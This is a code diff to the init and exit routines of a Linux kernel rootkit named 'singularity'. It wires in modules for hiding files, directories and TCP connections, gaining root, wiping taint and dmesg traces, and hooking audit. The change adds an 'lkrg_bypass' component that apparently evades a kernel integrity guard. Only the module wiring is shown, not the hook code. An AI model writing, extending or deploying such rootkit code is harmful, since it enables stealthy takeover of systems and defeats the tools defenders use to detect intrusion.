@@ -4,7 +4,6 @@
 #include "include/hiding_directory.h"
 #include "include/hiding_stat.h"
 #include "include/hiding_tcp.h"
-#include "include/hooking_insmod.h"
 #include "include/hooks_write.h"
 #include "include/clear_taint_dmesg.h"
 #include "include/hiding_chdir.h"
@@ -16,16 +15,17 @@
 #include "include/trace.h"
 #include "include/audit.h"
 #include "include/task.h"
+#include "include/lkrg_bypass.h"
 
 static int __init singularity_init(void) {
     int ret = 0;
     ret |= reset_tainted_init();
     ret |= hiding_open_init();
+    ret |= lkrg_bypass_init();
     ret |= become_root_init();
     ret |= hiding_directory_init();
     ret |= hiding_stat_init();
     ret |= hiding_tcp_init();
-    ret |= hooking_insmod_init();
     ret |= clear_taint_dmesg_init();
     ret |= hooks_write_init();
     ret |= hiding_chdir_init();
@@ -41,7 +41,6 @@ static int __init singularity_init(void) {
 
 static void __exit singularity_exit(void) {
     clear_taint_dmesg_exit();
-    hooking_insmod_exit();
     hiding_tcp_exit();
     hiding_stat_exit();
     hiding_directory_exit();
@@ -56,6 +55,7 @@ static void __exit singularity_exit(void) {
     trace_pid_cleanup();
     hooking_audit_exit();
     taskstats_hook_exit();
+    lkrg_bypass_exit();
 }
 
 module_init(singularity_init);
